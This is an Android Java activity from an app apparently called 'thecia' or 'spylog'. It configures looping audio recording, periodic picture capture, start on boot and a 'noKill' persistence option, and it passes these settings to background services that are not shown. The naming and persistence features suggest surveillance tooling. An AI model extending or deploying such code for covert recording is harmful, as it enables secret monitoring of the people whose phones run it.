package start.thecia;

import android.content.ComponentName;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;

import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.RadioButton;
import android.widget.Switch;
import android.widget.ToggleButton;


import androidx.appcompat.app.AppCompatActivity;

import start.thecia.Receivers.MyReceiver1;
import start.thecia.Receivers.MyReceiver;
import start.thecia.Services.TimeService;
import start.thecia.Services.c;
import start.thecia.Util.preferenceUtil;



public class config extends AppCompatActivity {
    RadioButton aRadio;
    RadioButton ACamera;
    EditText audio;
    EditText aPicAmt;
    EditText howManyPics;
    Button saveButton;
    Switch bootSwitch;
    Switch persistSwitch;
    SharedPreferences.Editor mEditor;
    SharedPreferences prefs;
    Boolean hasConfig;
    Boolean startAudio;
    Boolean StartCamera;
    boolean startBoot;
    ToggleButton setAudio;
    ToggleButton setPics;
    //flag for onBoot
    private int IntervalInSeconds;
    private int toRecord;
    int RecordTime;
    private final String noKill="noKill";
    boolean persist;
    int pictures;
    boolean hasSetPics;
    boolean hasSetAudio;
    PackageManager pm;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        final Intent serviceIntent = new Intent(getApplicationContext(), TimeService.class);
        Thread a=new Thread(
                new Runnable() {
                    @Override
                    public void run() {
                        getApplicationContext().startService(serviceIntent);
                        Log.i("strted","started");
                    }
                });

        a.start();
pm = getPackageManager();
        mEditor = getSharedPreferences("THESEPREFS", MODE_PRIVATE).edit();
        prefs = getSharedPreferences("THESEPREFS", MODE_PRIVATE);
        CheckPrefs();
        setContentView(R.layout.activity_config);
 aRadio=(RadioButton)findViewById(R.id.radioButton);
 ACamera=(RadioButton)findViewById(R.id.radioButton2);

   audio=(EditText)findViewById(R.id.RunTime);  if(hasSetAudio){audio.setText(Integer.toString(RecordTime));}
 audio.setHint("This is the length of time it should loop");
        aPicAmt=(EditText)findViewById(R.id.interval);
        aPicAmt.setHint("This is for the Interval Time for recording in seconds");
        howManyPics=(EditText)findViewById(R.id.picAmount);
      if(hasSetPics){howManyPics.setText(Integer.toString(pictures));}
       saveButton=(Button)findViewById(R.id.button);
         bootSwitch=(Switch)findViewById(R.id.switch1);
       if(startBoot){bootSwitch.setActivated(true);}
        setAudio=(ToggleButton)findViewById(R.id.button2);
        setPics=(ToggleButton)findViewById(R.id.toggleButton) ;
        persistSwitch=(Switch)findViewById(R.id.switch2);
       if(persist){persistSwitch.setChecked(true);}
        persistSwitch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                persist=true;
                preferenceUtil.addPref(mEditor,persist,"persist");
            }
        });
        bootSwitch.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
              if(hasConfig==null){hasConfig=true;}
                  startBoot=true;
                preferenceUtil.addPref(mEditor,startBoot,"startBoot");
                preferenceUtil.addPref(mEditor,hasConfig);
              }
});}


    public void getConfig(){
        ComponentName compName =
                new ComponentName(getApplicationContext(),
                        MyReceiver1.class);

        if(hasConfig){


            hasConfig=false;

            pm.setComponentEnabledSetting(
                    compName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            preferenceUtil.addPrefString(mEditor,"theConfig"); Log.i("Removing Receiver","RemovingREceiver");}
        else{
            hasConfig=true;

            Log.i("Enabl ON Boot Receiver","ENB");
            pm.setComponentEnabledSetting(
                    compName,
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);

            preferenceUtil.addPref(mEditor,hasConfig);
            hasConfig=true; preferenceUtil.addPref(mEditor,hasConfig);
            preferenceUtil.addPrefString(mEditor,"theConfig");
            IntentFilter b=new IntentFilter("start.spylog.hasConfig");
            IntentFilter C=new IntentFilter("start.thecia.Specific");
            Intent a=new Intent();
Intent B=new Intent();

            a.setAction("start.spylog.hasConfig");
            B.setAction("start.thecia.Specific");
            registerReceiver(new MyReceiver(),b);
            sendBroadcast(a.setAction("start.thecia.Specific"));
            B.putExtra("RunTime",RecordTime).putExtra("interval",IntervalInSeconds);
       if(hasSetPics){B.putExtra("hasSetPics",pictures);}
        if(persist){B.putExtra("noKill",noKill);}
            sendBroadcast(B);
        }
    }

       public void SetAudio(View view){startAudio=true;}
    public void SetCamera(View view){StartCamera=true;}
public void buttonSave(View view){


    getConfig();
}
public void setPics(View view){
    hasSetPics=true;
    pictures=Integer.parseInt(howManyPics.getText().toString());
    preferenceUtil.addPrefInt(mEditor,pictures,"pictures");
    preferenceUtil.addPref(mEditor,hasSetPics,"hasSetPics");
}

    public void setAudio(View view){
        hasSetAudio=true;
        preferenceUtil.addPref(mEditor, true,"hasSetAudio");
        RecordTime=Integer.parseInt(audio.getText().toString());
        IntervalInSeconds=  Integer.parseInt(aPicAmt.getText().toString());
        preferenceUtil.addPrefInt(mEditor,RecordTime,"RunTime");
        preferenceUtil.addPrefInt(mEditor,IntervalInSeconds,"interval");
    }
public void CheckPrefs(){
    if(prefs.contains("hasConfig")){
        hasConfig=prefs.getBoolean("hasConfig",hasConfig);}
    if(prefs.contains("hasSetPics")){
        hasSetPics=prefs.getBoolean("hasSetPics",hasSetPics);}
    if(prefs.contains("persist")){
       persist=prefs.getBoolean("persist",persist);}
    if(prefs.contains("startBoot")){
        startBoot=prefs.getBoolean("startBoot",startBoot);}
    if(prefs.contains("pictures")){
       pictures=prefs.getInt("pictures",pictures);

    }
    if(prefs.contains("hasSetAudio")){
        hasSetAudio=prefs.getBoolean("hasSetAudio",hasSetAudio);
        RecordTime=prefs.getInt("RunTime",RecordTime);
    }
}

        }